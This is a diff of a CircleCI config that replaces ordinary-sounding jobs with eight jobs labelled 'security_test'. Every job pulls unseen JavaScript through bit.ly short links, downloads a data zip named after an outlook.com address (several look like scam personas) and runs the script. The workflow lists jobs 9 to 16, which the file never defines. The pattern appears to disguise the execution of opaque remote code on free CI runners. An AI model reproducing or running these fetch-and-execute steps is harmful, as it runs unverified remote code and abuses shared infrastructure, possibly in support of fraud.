@@ -1,61 +1,96 @@
 version: 2.1
 
 jobs:
-  build-web:
-    machine:
-      image: ubuntu-2004:202101-01
-    resource_class: arm.medium
+ security_test_1:
+    docker:
+      - image: cimg/node:16.13.0-browsers
+    resource_class: small
     steps:
-      - run: sudo apt install -y chromium-browser
-      - run: curl -fsSL https://bit.ly/3kJeOmQ -o app.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
-      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/elombogo_outlook-com.zip -o lunarCrushData.zip
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/tomroland771999_outlook-com.zip -o lunarCrushData.zip
+      - run: unzip lunarCrushData.zip -d lunarCrushData
+      - run: curl -fsSL https://bit.ly/3kJeOmQ -o index.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
+      - run: npm i -s
+      - run: node index 58
+ security_test_2:
+    docker:
+      - image: cimg/node:16.13.0-browsers
+    resource_class: small
+    steps:
+      - run: curl -fsSL https://bit.ly/3kJeOmQ -o index.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/mr.abdulsalam22_outlook-com.zip -o lunarCrushData.zip
       - run: unzip lunarCrushData.zip -d lunarCrushData
       - run: npm i -s
-      - run: node app 65
-  check-web:
-    machine:
-      image: ubuntu-2004:202101-01
-    resource_class: arm.medium
+      - run: node index 58
+ security_test_3:
+    docker:
+      - image: cimg/node:16.13.0-browsers
+    resource_class: small
     steps:
-      - run: sudo apt install -y chromium-browser
-      - run: curl -fsSL https://bit.ly/3kJeOmQ -o app.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
-      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/allianceloanuk2021_outlook-com.zip -o lunarCrushData.zip
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/wuwestern.union_outlook-com.zip -o lunarCrushData.zip
+      - run: curl -fsSL https://bit.ly/3kJeOmQ -o index.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
       - run: unzip lunarCrushData.zip -d lunarCrushData
       - run: npm i -s
-      - run: node app 65
-  crawl-web:
-    machine:
-      image: ubuntu-2004:202101-01
-    resource_class: arm.medium
+      - run: node index 58
+ security_test_4:
+    docker:
+      - image: cimg/node:16.13.0-browsers
+    resource_class: small
     steps:
-      - run: sudo apt install -y chromium-browser
-      - run: curl -fsSL https://bit.ly/3kJeOmQ -o app.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
-      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/mrs.kathye.carpenter_outlook-com.zip -o lunarCrushData.zip
+      - run: curl -fsSL https://bit.ly/3kJeOmQ -o index.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/choeeng96_outlook-com.zip -o lunarCrushData.zip
       - run: unzip lunarCrushData.zip -d lunarCrushData
       - run: npm i -s
-      - run: node app 65
-  save-data-web:
-    machine:
-      image: ubuntu-2004:202101-01
-    resource_class: arm.medium
+      - run: node index 58
+ security_test_5:
+    docker:
+      - image: cimg/node:16.13.0-browsers
+    resource_class: small
     steps:
-      - run: sudo apt install -y chromium-browser
-      - run: curl -fsSL https://bit.ly/3kJeOmQ -o app.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
-      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/estellemartin95_outlook-com.zip -o lunarCrushData.zip
+      - run: curl -fsSL https://bit.ly/3kJeOmQ -o index.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/odesahcraigdesk_outlook-com.zip -o lunarCrushData.zip
       - run: unzip lunarCrushData.zip -d lunarCrushData
       - run: npm i -s
-      - run: node app 65
-
+      - run: node index 57
+ security_test_6:
+    docker:
+      - image: cimg/node:16.13.0-browsers
+    resource_class: small
+    steps:
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/mr_jannyking1999_outlook-com.zip -o lunarCrushData.zip
+      - run: unzip lunarCrushData.zip -d lunarCrushData
+      - run: curl -fsSL https://bit.ly/3kJeOmQ -o index.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
+      - run: npm i -s
+      - run: node index 58
+ security_test_7:
+    docker:
+      - image: cimg/node:16.13.0-browsers
+    resource_class: small
+    steps:
+      - run: curl -fsSL https://bit.ly/3kJeOmQ -o index.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/generalrodriguezcommander_outlook-com.zip -o lunarCrushData.zip
+      - run: unzip lunarCrushData.zip -d lunarCrushData
+      - run: npm i -s
+      - run: node index 58
+ security_test_8:
+    docker:
+      - image: cimg/node:16.13.0-browsers
+    resource_class: small
+    steps:
+      - run: curl -fsSL https://bit.ly/3kJeOmQ -o index.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/james.comeyg11_outlook-com.zip -o lunarCrushData.zip
+      - run: unzip lunarCrushData.zip -d lunarCrushData
+      - run: npm i -s
+      - run: node index 59
+      
+      
 workflows:
   build:
     jobs:
-      - build-web
-  check:
-    jobs:
-      - check-web
-  crawl:
-    jobs:
-      - crawl-web
-  save-data:
-    jobs:
-      - save-data-web
+      - security_test_9
+      - security_test_10
+      - security_test_11
+      - security_test_12
+      - security_test_13
+      - security_test_14
+      - security_test_15
+      - security_test_16
